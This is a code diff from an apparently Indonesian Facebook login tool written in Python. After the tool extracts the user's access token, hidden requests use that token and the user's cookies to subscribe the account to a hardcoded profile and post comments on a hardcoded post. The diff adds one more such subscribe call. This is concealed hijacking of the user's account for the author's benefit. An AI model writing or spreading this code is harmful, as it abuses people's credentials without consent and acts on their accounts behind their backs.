@@ -449,7 +449,8 @@ def login_lagi334():
 									tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
 									open(".token1.txt","w").write(tok1)
 									Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
-									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=" + tok1)
+									requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tok1))
+									requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":your_cookies})
 									requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":your_cookies})
@@ -500,7 +501,7 @@ def menu(my_name,my_id):
         tokenmu.append(tokenx)
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=" + tokenmu)
+        requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tokenmu))
     except IOError:
         Console().print(f" {H2}• {P2}[bold red] Cookies Kadaluarsa tolkon")
         os.system('rm -rf .token.txt && rm -rf .cok.txt')
